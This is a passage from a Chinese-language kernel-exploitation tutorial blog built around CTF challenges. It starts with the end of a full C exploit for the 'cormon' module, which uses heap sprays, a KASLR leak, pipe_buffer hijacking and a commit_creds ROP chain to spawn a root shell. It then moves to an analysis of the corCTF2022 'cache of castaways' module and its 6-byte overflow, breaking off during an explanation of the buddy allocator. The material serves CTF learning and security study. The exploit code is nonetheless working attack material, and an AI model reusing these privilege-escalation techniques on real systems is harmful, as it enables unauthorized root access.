class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEQ_NUM (2048 + 128)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_NUM 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cormon_fd;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seq_confuse</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> push_rsi_pop_rsp_ret = <span class="number">0xFFFFFFFF817AD641</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8116926d</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8245A960</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810EBA40</span>;</span><br><span class="line"><span class="type">size_t</span> pop_r14_pop_r15_ret = <span class="number">0xffffffff81001615</span>;</span><br><span class="line"><span class="type">size_t</span> find_task_by_vpid = <span class="number">0xFFFFFFFF810E4FC0</span>;</span><br><span class="line"><span class="type">size_t</span> init_fs = <span class="number">0xFFFFFFFF82589740</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff8101f5fc</span>;</span><br><span class="line"><span class="type">size_t</span> add_rax_rcx_ret = <span class="number">0xffffffff8102396f</span>;</span><br><span class="line"><span class="type">size_t</span> mov_mmrax_rbx_pop_rbx_ret = <span class="number">0xffffffff817e1d6d</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff811bce34</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_ret = <span class="number">0xffffffff81a05418</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81c00f97</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, (<span class="type">void</span> *) get_shell);</span><br><span class="line"></span><br><span class="line">    cormon_fd = open(<span class="string">&quot;/proc_rw/cormon&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (cormon_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open cormon.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> kernel_offset;</span><br><span class="line">    <span class="type">int</span> target_key;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saturating kmalloc-32 partial slabs...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> seq_fd[SEQ_NUM];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (seq_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] failed to open stat.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">2048</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying user keys in kmalloc-32...&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; KEY_NUM; j++) &#123;</span><br><span class="line">                setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;aaaaaa&quot;</span>, buf, <span class="number">32</span>, XATTR_CREATE);</span><br><span class="line">                key_alloc(j, buf, <span class="number">32</span>);</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">72</span>) &#123;</span><br><span class="line">                    bind_core(<span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;[*] Creating poll threads...&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">14</span>; k++) &#123;</span><br><span class="line">                        create_poll_thread(</span><br><span class="line">                            PAGE_SIZE + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd), </span><br><span class="line">                            <span class="number">3000</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">                    wait_poll_start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Corrupting poll_list next pointer...&quot;</span>);</span><br><span class="line">            write(cormon_fd, buf, PAGE_SIZE);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering arbitrary free...&quot;</span>);</span><br><span class="line">            join_poll_threads(seq_confuse, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Overwriting user key size / Spraying seq_operations structures...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking kernel pointer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">int</span> len = key_read(i, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        kernel_offset = search_kernel_offset(buf, len);</span><br><span class="line">        <span class="keyword">if</span> (kernel_offset != INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">            qword_dump(<span class="string">&quot;dump leak memory&quot;</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            target_key = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to leak kernel offset,try again.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    push_rsi_pop_rsp_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    pop_r14_pop_r15_ret += kernel_offset;</span><br><span class="line">    find_task_by_vpid += kernel_offset;</span><br><span class="line">    init_fs += kernel_offset;</span><br><span class="line">    pop_rcx_ret += kernel_offset;</span><br><span class="line">    add_rax_rcx_ret += kernel_offset;</span><br><span class="line">    mov_mmrax_rbx_pop_rbx_ret += kernel_offset;</span><br><span class="line">    pop_rbx_ret += kernel_offset;</span><br><span class="line">    swapgs_ret += kernel_offset;</span><br><span class="line">    iretq += kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing user keys...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != target_key) &#123;</span><br><span class="line">            key_unlink(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying tty_file_private / tty_struct structures...&quot;</span>);</span><br><span class="line">    <span class="type">int</span> tty_fd[TTY_NUM];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TTY_NUM; i++) &#123;</span><br><span class="line">        tty_fd[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span> (tty_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] failed to open ptmx&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking heap pointer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> target_object = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> len = key_read(target_key, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    qword_dump(<span class="string">&quot;dump leak memory&quot;</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> *<span class="title">head</span> =</span> (<span class="type">void</span> *) &amp;buf[i];</span><br><span class="line">        <span class="keyword">if</span> (is_dir_mapping_addr((<span class="type">size_t</span>) head-&gt;tty) &amp;&amp; !(((<span class="type">size_t</span>) head-&gt;tty) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            &amp;&amp; head-&gt;<span class="built_in">list</span>.next == head-&gt;<span class="built_in">list</span>.prev &amp;&amp; head-&gt;<span class="built_in">list</span>.prev != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            qword_dump(<span class="string">&quot;leak tty_struct addr from tty_file_private&quot;</span>, &amp;buf[i], </span><br><span class="line">                       <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_file_private));</span><br><span class="line">            target_object = (<span class="type">size_t</span>) head-&gt;tty;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct addr: %p\n&quot;</span>, target_object);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (target_object == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to leak tty_struct addr.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing seq_operation structures...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2048</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        close(seq_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Creating poll threads...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">192</span>; i++) &#123;</span><br><span class="line">        create_poll_thread(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd), <span class="number">3000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    wait_poll_start();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing corrupted key...&quot;</span>);</span><br><span class="line">    key_unlink(target_key);</span><br><span class="line">    sleep(<span class="number">1</span>); <span class="comment">// GC key</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Overwriting poll_list next pointer...&quot;</span>);</span><br><span class="line">    <span class="type">char</span> key[<span class="number">32</span>] = &#123;&#125;;</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">0</span>] = target_object - <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_NUM; i++) &#123;</span><br><span class="line">        setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;aaaaaa&quot;</span>, buf, <span class="number">32</span>, XATTR_CREATE);</span><br><span class="line">        key_alloc(i, key, <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing tty_struct structures...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TTY_NUM; i++) &#123;</span><br><span class="line">        close(tty_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>); <span class="comment">// GC TTYs</span></span><br><span class="line">    <span class="type">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying pipe_bufer structures...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        pipe(pipe_fd[i]);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;aaaaaa&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering arbitrary free...&quot;</span>);</span><br><span class="line">    join_poll_threads(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">struct</span> pipe_bufer *) buf)-&gt;ops = (<span class="type">void</span> *) (target_object + <span class="number">0x300</span>);</span><br><span class="line">    ((<span class="keyword">struct</span> pipe_buf_operations *) &amp;buf[<span class="number">0x300</span>])-&gt;release = (<span class="type">void</span> *) push_rsi_pop_rsp_ret;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) buf;</span><br><span class="line"></span><br><span class="line">    *rop++ = pop_r14_pop_r15_ret;</span><br><span class="line">    rop++;</span><br><span class="line">    rop++; <span class="comment">// ops</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// commit_creds(&amp;init_creds)</span></span><br><span class="line">    *rop++ = pop_rdi_ret;</span><br><span class="line">    *rop++ = init_cred;</span><br><span class="line">    *rop++ = commit_creds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// current = find_task_by_vpid(getpid())</span></span><br><span class="line">    *rop++ = pop_rdi_ret;</span><br><span class="line">    *rop++ = getpid();</span><br><span class="line">    *rop++ = find_task_by_vpid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// current-&gt;fs = &amp;init_fs</span></span><br><span class="line">    *rop++ = pop_rcx_ret;</span><br><span class="line">    *rop++ = <span class="number">0x6e0</span>;</span><br><span class="line">    *rop++ = add_rax_rcx_ret;</span><br><span class="line">    *rop++ = pop_rbx_ret;</span><br><span class="line">    *rop++ = init_fs;</span><br><span class="line">    *rop++ = mov_mmrax_rbx_pop_rbx_ret;</span><br><span class="line">    rop++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// back to user</span></span><br><span class="line">    *rop++ = swapgs_ret;</span><br><span class="line">    *rop++ = iretq;</span><br><span class="line">    *rop++ = (<span class="type">uint64_t</span>) get_shell;</span><br><span class="line">    *rop++ = user_cs;</span><br><span class="line">    *rop++ = user_rflags;</span><br><span class="line">    *rop++ = user_sp;</span><br><span class="line">    *rop++ = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying ROP chain...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">        key_alloc(i, buf, <span class="number">1024</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking control flow...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>多试几次还是可以成功的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20241010203455359.png"
                      alt="image-20241010203455359.png"
                ></p>
<h2 id="corCTF2022-cache-of-castways"><a href="#corCTF2022-cache-of-castways" class="headerlink" title="corCTF2022 cache of castways"></a>corCTF2022 cache of castways</h2><h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p><strong>保护机制</strong></p>
<p>题目给了<code>kconfig</code>文件，<code>SMAP</code>, <code>SMEP</code>, <code>KPTI</code>, <code>KASLR</code> 及常用的保护机制，内核版本是 <code>5.18.3</code> 所以禁用了 <code>msg_msg</code>。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -m 4096M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on&quot;</span> \</span><br><span class="line">    -netdev user,<span class="built_in">id</span>=net \</span><br><span class="line">    -device e1000, netdev=net \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -initrd initramfs.cpio</span><br></pre></td></tr></table></figure></div>

<p><strong>逆向分析</strong></p>
<p>在启动脚本里加载了一个名为 <code>cache_of_castaway.ko</code> 的 LKM，按惯例丢进 IDA，在模块初始化时注册了设备并创建了一个 <code>kmem_cache</code>，分配的 object 的 size 为 <code>512</code>，创建 flag 为 <code>SLAB_ACCOUNT | SLAB_PANIC</code>，同时开启了 <code>CONFIG_MEMCG_KMEM=y</code>，这意味着这是一个<strong>独立的 kmem_cache</strong>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  castaway_dev = <span class="number">255</span>;</span><br><span class="line">  qword_8A8 = (__int64)<span class="string">&quot;castaway&quot;</span>;</span><br><span class="line">  qword_8B0 = (__int64)&amp;castaway_fops;</span><br><span class="line">  _mutex_init(&amp;castaway_lock, <span class="string">&quot;&amp;castaway_lock&quot;</span>, &amp;_key_28999);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)misc_register(&amp;castaway_dev)</span><br><span class="line">    &amp;&amp; (castaway_arr = kmem_cache_alloc(kmalloc_caches[<span class="number">12</span>], <span class="number">3520LL</span>)) != <span class="number">0</span></span><br><span class="line">    &amp;&amp; (castaway_cachep = kmem_cache_create(<span class="string">&quot;castaway_cache&quot;</span>, <span class="number">0x200</span>LL, <span class="number">1LL</span>, <span class="number">0x4040000</span>LL, <span class="number">0LL</span>)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = init_castaway_driver_cold();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>设备只定义了一个 ioctl，其中包含分配与编辑堆块的功能且都有锁，最多可以分配 400 个 object，没有释放功能：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">castaway_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">3</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0xCAFEBABE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v6, a3, <span class="number">24LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    mutex_lock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0xF00DBABE</span> )</span><br><span class="line">      v3 = castaway_edit(v6[<span class="number">0</span>], v6[<span class="number">1</span>], v6[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">-1LL</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">    mutex_unlock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_lock(&amp;castaway_lock);</span><br><span class="line">  v3 = castaway_ctr;</span><br><span class="line">  <span class="keyword">if</span> ( castaway_ctr &lt;= <span class="number">399</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++castaway_ctr;</span><br><span class="line">    v5 = (_QWORD *)(castaway_arr + <span class="number">8</span> * v3);</span><br><span class="line">    *v5 = kmem_cache_alloc(castaway_cachep, <span class="number">0x400DC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(castaway_arr + <span class="number">8</span> * v3) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))castaway_ioctl_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>漏洞便存在于编辑堆块的 <code>castaway_edit()</code> 当中，在拷贝数据时会故意从 <code>object + 6</code> 的地方开始拷贝，从而存在一个 6 字节的溢出，这里因为是先拷贝到内核栈上再进行内核空间中的拷贝所以不会触发 <code>hardened usercopy</code> 的检查：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">castaway_edit</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">size_t</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> src[<span class="number">512</span>]; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+200h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x18F</span> )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)(castaway_arr + <span class="number">8</span> * a1) )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x200</span> )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  _check_object_size(src, a2, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(src, a3, a2) )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)(*(_QWORD *)(castaway_arr + <span class="number">8</span> * a1) + <span class="number">6LL</span>), src, a2);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编辑堆块时我们应当向内核中传入如下结构：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> index;</span><br><span class="line">    <span class="type">size_t</span>	size;</span><br><span class="line">    <span class="type">void</span> 	*buf;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-25"><a href="#利用思路-25" class="headerlink" title="利用思路"></a>利用思路</h3><p>由于我们的漏洞对象位于独立的 <code>kmem_cache</code> 中，因此其不会与内核中的其他常用结构体的分配混用，我们无法直接通过 slub 层的堆喷 + 堆风水来溢出到其他结构体来进行下一步利用；同时由于 slub 并不会像 glibc 的ptmalloc2 那样在每个  object 开头都有个存储数据的 header，而是将 next 指针放在一个随机的位置，我们很难直接溢出到下一个 object 的 next 域，由于 hardened freelist 的存在就算我们能溢出到下一个相邻 object 的 next  域也没法构造出一个合法的指针；而在我们的 slub 页面相邻的页面上的数据对我们来说也是未知的，直接溢出的话我们并不知道能够溢出到什么页面上。</p>
<p>让我们把目光重新放到 slub allocator 上，当 freelist page 已经耗空且 partial 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 buddy system 申请页面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/yPtXiwzVfxWH7lE-1733799601040-1.png"
                      alt="yPtXiwzVfxWH7lE"
                ></p>
<p>buddy system 的基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶  order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order  链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/79biltjNfACIZcP.gif"
                      alt="79biltjNfACIZcP"
                ></p>
